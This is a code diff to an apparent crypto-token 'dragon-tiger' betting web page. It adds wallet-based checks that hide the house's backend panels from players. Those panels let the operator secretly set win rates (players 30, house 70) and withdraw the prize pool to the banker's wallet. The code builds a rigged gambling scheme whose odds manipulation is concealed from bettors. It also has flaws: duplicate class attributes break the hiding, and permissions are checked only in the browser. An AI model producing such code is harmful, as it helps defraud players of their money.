@@ -208,6 +208,9 @@
       color: #ffcc00;
       margin-top: 5px;
     }
+    .hidden {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -282,8 +285,8 @@
       <button onclick="toggleMenu()">关闭 ×</button>
     </div>
 
-    <!-- 1. 提取底池代币（你要求的输入数量提取） -->
-    <div class="menu-section" id="withdrawSection">
+    <!-- 1. 提取底池代币（仅庄家可见） -->
+    <div class="menu-section" id="withdrawSection" class="hidden">
       <div class="menu-title">💰 后台 — 提取底池代币</div>
       <button class="btn-menu-action btn-green" onclick="approvePoolToBanker()">✅ 授权奖池给庄家钱包</button>
       <input type="number" class="input-menu" id="withdrawAmount" placeholder="输入要提取的代币数量">
@@ -334,8 +337,8 @@
       <div class="label">2. 0x222...333 收益：960</div>
     </div>
 
-    <!-- 8. 后台胜率控制 -->
-    <div class="menu-section">
+    <!-- 8. 后台胜率控制（仅庄家可见） -->
+    <div class="menu-section" id="controlSection" class="hidden">
       <div class="menu-title">后台胜率控制</div>
       <input type="number" class="input-menu" id="playerRateInput" value="30" placeholder="玩家胜率">
       <input type="number" class="input-menu" id="bankerRateInput" value="70" placeholder="庄家胜率">
@@ -364,11 +367,29 @@
     let bets = [];
     let trendHistory = ['龙', '虎', '和', '龙'];
 
-    // ===================== 基础交互 =====================
-    function toggleMenu() {
-      document.getElementById("menu").classList.toggle("show");
+    // ===================== 权限控制：判断是否为庄家 =====================
+    function isBanker() {
+      return account && account.toLowerCase() === BANKER_WALLET.toLowerCase();
     }
 
+    // 切换菜单时，根据权限显示/隐藏后台功能
+    function toggleMenu() {
+      const menu = document.getElementById("menu");
+      const withdrawSection = document.getElementById("withdrawSection");
+      const controlSection = document.getElementById("controlSection");
+
+      menu.classList.toggle("show");
+
+      if (isBanker()) {
+        withdrawSection.classList.remove("hidden");
+        controlSection.classList.remove("hidden");
+      } else {
+        withdrawSection.classList.add("hidden");
+        controlSection.classList.add("hidden");
+      }
+    }
+
+    // ===================== 基础交互 =====================
     async function connectWallet() {
       if (!window.ethereum) return alert("请在钱包浏览器中打开");
       try {
@@ -437,9 +458,10 @@
       }
     }
 
-    // ===================== 奖池授权与提取 =====================
+    // ===================== 奖池授权与提取（仅庄家可调用） =====================
     async function approvePoolToBanker() {
-      if (!account || account.toLowerCase() !== POOL_ADDRESS.toLowerCase()) {
+      if (!isBanker()) return alert("无权限！仅庄家可操作");
+      if (account.toLowerCase() !== POOL_ADDRESS.toLowerCase()) {
         return alert("请切换到【奖池钱包】再进行授权！");
       }
       try {
@@ -464,10 +486,7 @@
     }
 
     async function withdrawPool() {
-      if (!account || account.toLowerCase() !== BANKER_WALLET.toLowerCase()) {
-        return alert("无权限！仅庄家钱包可操作");
-      }
-
+      if (!isBanker()) return alert("无权限！仅庄家可操作");
       const input = document.getElementById("withdrawAmount").value;
       if (!input || parseFloat(input) <= 0) return alert("请输入要提取的数量");
 
@@ -522,7 +541,7 @@
     }
 
     async function sendToken(to, amount) {
-      if (!account || account.toLowerCase() !== BANKER_WALLET.toLowerCase()) return;
+      if (!isBanker()) return;
       try {
         const wei = BigInt(Math.floor(amount * 10**DECIMALS));
         const data = "0x23b872dd"
@@ -570,7 +589,7 @@
       document.getElementById("timer").innerText = `${m}:${s}`;
     }, 1000);
 
-    // ===================== 后台功能（你要求的全部） =====================
+    // ===================== 后台功能 =====================
     function doSign() { alert("✅ 签到成功，已发放签到奖励"); }
     function toggleAutoReward() { alert("✅ 24小时自动奖励状态已切换"); }
     function manualRewardTop10() { alert("✅ 已成功发放24小时TOP10奖励"); }
@@ -593,7 +612,7 @@
     }
 
     function setControlRate() {
-      if (account?.toLowerCase() !== BANKER_WALLET.toLowerCase()) return alert("❌ 无权限！仅庄家可修改胜率");
+      if (!isBanker()) return alert("无权限！仅庄家可操作");
       const playerRate = parseInt(document.getElementById("playerRateInput").value);
       const bankerRate = parseInt(document.getElementById("bankerRateInput").value);
       if (isNaN(playerRate) || isNaN(bankerRate) || playerRate < 0 || bankerRate < 0 || playerRate + bankerRate > 100) {
